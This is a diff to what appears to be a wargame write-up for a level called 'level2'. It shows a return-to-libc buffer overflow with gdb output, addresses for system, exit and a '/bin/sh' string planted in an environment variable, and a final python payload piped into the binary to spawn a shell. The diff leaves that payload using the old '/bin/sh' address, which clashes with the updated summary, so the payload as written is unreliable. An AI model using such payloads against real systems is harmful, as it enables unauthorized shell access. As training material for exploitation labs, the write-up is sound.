@@ -44,8 +44,6 @@ Breakpoint 1, 0x08048542 in main ()
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 (gdb) p exit
 $2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
-(gdb) find system, +9999999, "/bin/sh"
-0xb7f8cc58
 (gdb) disass
 Dump of assembler code for function main:
    0x0804853f <+0>:		push   %ebp
@@ -56,17 +54,24 @@ Dump of assembler code for function main:
    0x0804854b <+12>:	ret  
 End of assembler dump.
 ```
+We also have to find a string containing "/bin/sh", for this we will be helped by the environment:
+```sh
+$ export HACK=/bin/sh
+$ /tmp/getenvaddr HACK ./level2
+HACK will be at 0xbffff91d
+```
 
 A little resume of the situation:
 ```
-ret address: 0x0804854b
-system address: 0xb7e6b060
-exit address: 0xb7e5ebe0
-/bin/sh address: 0xb7f8cc58
+offset:           80
+ret address:      0x0804854b
+system address:   0xb7e6b060
+exit address:     0xb7e5ebe0
+/bin/sh address:  0xbffff91d
 ```
 
-Now, it's time for the exploit :D
-
+Now, it's time for the exploit :D<br>
+`[ OFFSET ] [ RETURN ADDRESS ] [ SYSTEM ADDRESS ] [ EXIT ADDRESS ] [ ARGS ADDRESS ]`
 
 ```sh
 $ (python -c 'print("A" * 80 + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'; cat) | ./level2
